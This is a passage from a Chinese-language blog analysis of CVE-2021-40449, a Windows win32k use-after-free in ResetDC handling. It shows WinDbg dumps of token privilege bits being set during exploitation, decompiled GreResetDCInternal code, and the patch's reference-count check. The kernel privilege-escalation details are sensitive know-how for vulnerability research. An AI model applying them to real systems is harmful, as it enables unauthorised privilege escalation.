style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq ffff885e80063000<span style="color:#f92672">+</span><span style="color:#ae81ff">0x750</span><span style="color:#75715e">// 此处为RtlBitMap地址</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">80063750</span> ffffb48d<span style="color:#960050;background-color:#1e0010">`</span>a3839010 ffffffff<span style="color:#960050;background-color:#1e0010">`</span>ffffffff</span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">80063760</span> ffffffff<span style="color:#960050;background-color:#1e0010">`</span>ffffffff ffffffff<span style="color:#960050;background-color:#1e0010">`</span>ffffffff</span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">80063770</span> ffffffff<span style="color:#960050;background-color:#1e0010">`</span>ffffffff ffffffff<span style="color:#960050;background-color:#1e0010">`</span>ffffffff</span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">80063780</span> ffffffff<span style="color:#960050;background-color:#1e0010">`</span>ffffffff ffffffff<span style="color:#960050;background-color:#1e0010">`</span>ffffffff</span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">80063790</span> ffffffff<span style="color:#960050;background-color:#1e0010">`</span>ffffffff ffffffff<span style="color:#960050;background-color:#1e0010">`</span>ffffffff</span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">800637</span>a0 ffffffff<span style="color:#960050;background-color:#1e0010">`</span>ffffffff ffffffff<span style="color:#960050;background-color:#1e0010">`</span>ffffffff</span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">800637</span>b0 ffffffff<span style="color:#960050;background-color:#1e0010">`</span>ffffffff ffffffff<span style="color:#960050;background-color:#1e0010">`</span>ffffffff</span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">800637</span>c0 ffffffff<span style="color:#960050;background-color:#1e0010">`</span>ffffffff ffffffff<span style="color:#960050;background-color:#1e0010">`</span>ffffffff</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq ffffb48d<span style="color:#960050;background-color:#1e0010">`</span>a3839010<span style="color:#75715e">// 此处存放了RtlBitMap结构，0x00-0x08为size，0x08-0x10为buffer指针，指向了自身的权限位</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/>ffffb48d<span style="color:#960050;background-color:#1e0010">`</span>a3839010<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">000000</span><span style="color:#ae81ff">80</span> ffffde8f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">1f</span>b2e9d0</span></span><span style="display:flex;"><span>ffffb48d<span style="color:#960050;background-color:#1e0010">`</span>a3839020<span style="color:#ae81ff">41414141</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">41414141</span><span style="color:#ae81ff">41414141</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">41414141</span></span></span><span style="display:flex;"><span>ffffb48d<span style="color:#960050;background-color:#1e0010">`</span>a3839030<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffb48d<span style="color:#960050;background-color:#1e0010">`</span>a3839040<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffb48d<span style="color:#960050;background-color:#1e0010">`</span>a3839050<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffb48d<span style="color:#960050;background-color:#1e0010">`</span>a3839060<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffb48d<span style="color:#960050;background-color:#1e0010">`</span>a3839070<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffb48d<span style="color:#960050;background-color:#1e0010">`</span>a3839080<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq ffffde8f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">1f</span>b2e9d0</span></span><span style="display:flex;"><span>ffffde8f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">1f</span>b2e9d0<span style="color:#ae81ff">00000006</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">02</span><span style="color:#ae81ff">880000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">800000</span></span></span><span style="display:flex;"><span>ffffde8f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">1f</span>b2e9e0<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">800000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffde8f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">1f</span>b2e9f0<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffde8f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">1f</span>b2ea00<span style="color:#ae81ff">20010000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">0000000f</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000001</span></span></span><span style="display:flex;"><span>ffffde8f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">1f</span>b2ea10<span style="color:#ae81ff">000001e0</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00001000</span></span></span><span style="display:flex;"><span>ffffde8f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">1f</span>b2ea20<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span> ffffde8f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">1f</span>b2ee18</span></span><span style="display:flex;"><span>ffffde8f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">1f</span>b2ea30<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span> ffffde8f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">1f1007f</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span>ffffde8f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">1f</span>b2ea40 ffffde8f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">1f1007f</span><span style="color:#ae81ff">0</span> ffffde8f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">1f</span><span style="color:#ae81ff">10080</span>c</span></span></code></pre></div><p>调用DC里面的函数指针之前，自身权限位为正常权限。</p><p><img alt="image-20211112202144360" src="/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211112202144360.png"/></p><p>调用函数指针之后，可以看到权限位全部置为了1</p><p><img alt="image-20211112202350655" src="/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211112202350655.png"/></p><h4 id="补丁分析">补丁分析</h4><p>在<strong>漏洞利用分析</strong>里面分析过漏洞形成原因是因为在调用GreResetDCInternal函数时，使用DC对象指针的时候没有检查DC对象是否异常。而利用该漏洞是通过在调用回调函数时调用ResetDC实现的。</p><p>我们再次回顾一下漏洞函数，在调用hdcOpenDCW也就是在调用回调函数之前会通过DCO的构造函数从DC构造DCO对象，在基本概念中知道，内核对象每被引用一次则对象引用计数器值会加一。调用构造函数时，DC对象引用加一，正常情况下此时DC对象引用次数要为1。如果在回调函数中再次调用ResetDC，则会第二次调用GreResetDCInternal，再次调用DCO的构造函数，DC对象引用再次加一，此时引用次数为2。</p><p>所以判断DC对象异常可以通过判断DC对象的引用次数实现。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> __usercall GreResetDCInternal<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#f92672">&lt;</span>rax<span style="color:#f92672">></span>(HDC a1<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#f92672">&lt;</span>rcx<span style="color:#f92672">></span>,<span style="color:#66d9ef">__int64</span> a2<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#f92672">&lt;</span>rdx<span style="color:#f92672">></span>,<span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>a3<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#f92672">&lt;</span>r8<span style="color:#f92672">></span>)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> v24;<span style="color:#75715e">// [rsp+50h] [rbp-20h]</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v25;<span style="color:#75715e">// [rsp+60h] [rbp-10h]</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> DCOBJ<span style="color:#f92672">::</span><span style="color:#a6e22e">DCOBJ</span>((DCOBJ<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v25, a1);<span style="color:#75715e">// 利用构造函数从HDC创建DCOBJ对象</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> v8<span style="color:#f92672">=</span> v25;</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">··········</span></span></span><span style="display:flex;"><span> v10<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v8<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>);<span style="color:#75715e">// 赋值</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v10<span style="color:#f92672">+</span><span style="color:#ae81ff">1736</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v24<span style="color:#f92672">=</span> v11;</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">·······</span></span></span><span style="display:flex;"><span> v9<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v25<span style="color:#f92672">+</span><span style="color:#ae81ff">512</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v25<span style="color:#f92672">+</span><span style="color:#ae81ff">120</span>)<span style="color:#f92672">></span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">·······</span></span></span><span style="display:flex;"><span> v13<span style="color:#f92672">=</span> (HDC)<span style="color:#a6e22e">hdcOpenDCW</span>(<span style="color:#f92672">&amp;</span>qword_1C0141EB0, v26,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">0</span>i64,<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v10<span style="color:#f92672">+</span><span style="color:#ae81ff">2584</span>));<span style="color:#75715e">// 创建新的DC对象，返回对应的HDC句柄</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">if</span> ( v13 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v10<span style="color:#f92672">+</span><span style="color:#ae81ff">2584</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> DCOBJ<span style="color:#f92672">::</span><span style="color:#a6e22e">DCOBJ</span>((DCOBJ<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v24, v13);</span></span><span style="display:flex;"><span> v14<span style="color:#f92672">=</span> (_QWORD<span style="color:#f92672">*</span>)v24;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v24 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v12 )</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v24<span style="color:#f92672">+</span><span style="color:#ae81ff">120</span>)<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v24<span style="color:#f92672">+</span><span style="color:#ae81ff">116</span>);</span></span><span style="display:flex;"><span> v14[<span style="color:#ae81ff">308</span>]<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v25<span style="color:#f92672">+</span><span style="color:#ae81ff">2464</span>);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v25<span style="color:#f92672">+</span><span style="color:#ae81ff">2464</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v14[<span style="color:#ae81ff">309</span>]<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v25<span style="color:#f92672">+</span><span style="color:#ae81ff">2472</span>);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v25<span style="color:#f92672">+</span><span style="color:#ae81ff">2472</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v15<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">**</span>)(_QWORD, _QWORD))(v10<span style="color:#f92672">+</span><span style="color:#ae81ff">2768</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v15 )</span></span><span style="display:flex;"><span><span style="color:#a6e22e">v15</span>(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v10<span style="color:#f92672">+</span><span style="color:#ae81ff">1824</span>),<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v14[<span style="color:#ae81ff">6</span>]<span style="color:#f92672">+</span><span style="color:#ae81ff">1824</span>i64));<span style="color:#75715e">// 调用函数指针指向的函数，传入参数为用户传入的HDC对应的DC对象内的值</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#960050;background-color:#1e0010">·······</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">HmgSwapLockedHandleContents</span>(v3,<span style="color:#ae81ff">0</span>i64, v6,<span style="color:#ae81ff">0</span>i64, v23);<span style="color:#75715e">// 交换旧的和新的HDC对象</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">GreReleaseHmgrSemaphore</span>();</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">······</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">bDeleteDCInternal</span>(v6,<span style="color:#ae81ff">1</span>i64,<span style="color:#ae81ff">0</span>i64);<span style="color:#75715e">// 删除了hdcOpenDCW分配的HDC，但前面经过HmgSwapLockedHandleContents交换了句柄，实际删除的是旧的HDC</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#960050;background-color:#1e0010">······</span></span></span></code></pre></div><p>在补丁中，增加了对DC对象引用次数进行判断的逻辑，如果在GreResetDCInternal函数中DC对象引用次数大于1则表明已经发生异常，进入异常逻辑抛出错误(因为按正常流程此处DC对象引用次数应为不应该大于1)。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span><span style="color:#a6e22e">sub_1C014CB0C</span>(<span style="color:#66d9ef">__int64</span> a1,<span style="color:#66d9ef">__int64</span> a2,<span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>a3)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>v30;<span style="color:#75715e">// [rsp+30h] [rbp-1h]</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> .....</span></span><span style="display:flex;"><span> v9<span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span>)v30;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>v30 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span>LABEL_6:</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EngSetLastError</span>(<span style="color:#ae81ff">6</span>i64);</span></span><span style="display:flex;"><span>LABEL_7:</span></span><span style="display:flex;"><span> v13<span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span>)v30;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_8;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((_WORD<span style="color:#f92672">*</span>)v30<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>)<span style="color:#f92672">></span><span style="color:#ae81ff">1u</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>stru_1C032C3F8.Length<span style="color:#f92672">></span><span style="color:#ae81ff">5u</span><span style="color:#f92672">&amp;&amp;</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span>)<span style="color:#a6e22e">sub_1C00B5068</span>(<span style="color:#f92672">&amp;</span>stru_1C032C3F8,<span style="color:#ae81ff">0x400000000000</span>i64) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v31<span style="color:#f92672">=</span><span style="color:#f92672">&amp;</span>v25;</span></span><span style="display:flex;"><span> v30<span style="color:#f92672">=</span><span style="color:#f92672">&amp;</span>v26;</span></span><span style="display:flex;"><span> v29<span style="color:#f92672">=</span><span style="color:#f92672">&amp;</span>v28;</span></span><span style="display:flex;"><span> v28<span style="color:#f92672">=</span><span style="color:#ae81ff">0x1000000</span>i64;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SysEntryGetDispatchTableValues</span>(v10, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>unk_1C02F466B, v11, v12);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_6;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>参考链接：</p><blockquote><p><a href="https://www.secrss.com/articles/35266" target="_blank">https://www.secrss.com/articles/35266</a></p><p><a href="https://mp.weixin.qq.com/s/AcFS0Yn9SDuYxFnzbBqhkQ" target="_blank">https://mp.weixin.qq.com/s/AcFS0Yn9SDuYxFnzbBqhkQ</a></p><p><a href="https://bbs.pediy.com/thread-269930.htm" target="_blank">https://bbs.pediy.com/thread-269930.htm</a></p></blockquote></description></item></channel></rss>